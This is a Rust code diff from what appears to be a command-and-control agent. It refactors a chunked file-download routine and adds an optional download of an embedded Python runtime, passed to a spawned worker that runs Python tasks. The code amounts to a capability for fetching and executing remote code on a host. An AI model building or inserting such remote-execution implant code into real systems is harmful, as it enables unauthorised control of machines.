@@ -9,16 +9,10 @@ const CHUNK_SIZE: usize = 4096;
 struct UploadParams {
     file_id: String,
     parameters: String,
+    python_embed_id: Option<String>,
 }
 
-pub fn executePY(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
-    // 1. Extract fields
-    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
-    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
-    let params: UploadParams = serde_json::from_str(raw)?;
-    let file_id = &params.file_id;
-
-    // 2. Download chunks into buffer
+fn download_file_bytes(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let mut file_bytes = Vec::new();
     let mut chunk_num = 1;
     let mut total_chunks = 1;
@@ -32,7 +26,7 @@ pub fn executePY(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
                     "file_id": file_id,
                     "chunk_num": chunk_num
                 },
-                "task_id": id
+                "task_id": task_id
             }]
         })
         .to_string();
@@ -45,12 +39,35 @@ pub fn executePY(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         chunk_num += 1;
     }
 
+    Ok(file_bytes)
+}
+
+pub fn executePY(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
+    // 1. Extract fields
+    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
+    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
+    let params: UploadParams = serde_json::from_str(raw)?;
+    let file_id = &params.file_id;
+
+    // 2. Download chunks into buffer
+    let file_bytes = download_file_bytes(id, file_id)?;
+    let python_embed_bytes = if let Some(embed_id) = &params.python_embed_id {
+        if embed_id.is_empty() {
+            None
+        } else {
+            Some(download_file_bytes(id, embed_id)?)
+        }
+    } else {
+        None
+    };
+
     // 3. Spawn self as isolated worker process so a crash/exit in the
     //    Python runtime doesn't take down the agent.
     let exe = std::env::current_exe()?;
     let worker_input = json!({
         "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
-        "parameters": params.parameters
+        "parameters": params.parameters,
+        "python_embed_bytes": python_embed_bytes.map(|b| general_purpose::STANDARD.encode(&b))
     })
     .to_string();
 
